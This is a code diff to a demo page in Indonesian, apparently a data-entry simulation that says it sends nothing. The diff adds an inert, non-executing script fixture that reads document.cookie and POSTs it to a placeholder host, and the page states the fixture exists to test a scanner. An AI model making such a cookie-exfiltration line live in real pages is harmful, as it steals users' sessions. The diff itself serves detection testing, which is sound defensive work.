@@ -33,6 +33,11 @@ const demoPage = `<!doctype html>
       <button type="submit">Simulasikan · tidak mengirim data</button>
     </form>
     <p id="notice" hidden>Simulasi selesai. Tidak ada data yang dikirim atau disimpan.</p>
+    <script type="text/plain" id="inert-indicator-fixture">
+      const cookieSample = document.cookie;
+      fetch("https://capture.example.invalid/collect", { method: "POST", body: cookieSample });
+    </script>
+    <p>Contoh pola akses cookie dan pengiriman jaringan di atas adalah teks inert untuk menguji scanner; browser tidak menjalankannya.</p>
   </main>
 </body>
 </html>`;
